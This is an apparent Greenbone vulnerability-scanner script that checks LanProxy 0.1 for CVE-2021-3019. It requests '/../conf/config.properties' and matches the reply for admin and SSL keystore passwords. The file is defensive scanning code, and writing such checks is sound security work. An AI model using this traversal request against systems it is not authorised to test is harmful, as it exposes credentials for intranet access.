# SPDX-FileCopyrightText: 2021 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:lanproxy_project:lanproxy";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.145290");
  script_version("2025-01-21T05:37:33+0000");
  script_tag(name:"last_modification", value:"2025-01-21 05:37:33 +0000 (Tue, 21 Jan 2025)");
  script_tag(name:"creation_date", value:"2021-02-01 06:37:52 +0000 (Mon, 01 Feb 2021)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2021-01-07 19:56:00 +0000 (Thu, 07 Jan 2021)");

  script_cve_id("CVE-2021-3019");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("LanProxy 0.1 Directory Traversal Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2021 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_lanproxy_http_detect.nasl");
  script_require_ports("Services/www", 8090);
  script_mandatory_keys("lanproxy/detected");

  script_tag(name:"summary", value:"LanProxy is prone to a directory traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"It is possible to read /../conf/config.properties and obtain
  credentials for a connection to the intranet.");

  script_tag(name:"affected", value:"LanProxy version 0.1.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_xref(name:"URL", value:"https://github.com/maybe-why-not/lanproxy/issues/1");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + "/../conf/config.properties";

req = http_get(port: port, item: url);
res = http_keepalive_send_recv(port: port, data: req, bodyonly: TRUE);

if (egrep(string: res, pattern: "^\s*(config\.admin\.(username|password)|server\.ssl\.key(Manager|Store)Password)\s*=.+", icase: FALSE)) {
  report = 'It was possible to obtain the property file at ' + http_report_vuln_url(port: port, url: url, url_only: TRUE) +
           '\n\nResult:\n\n' + chomp(res);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
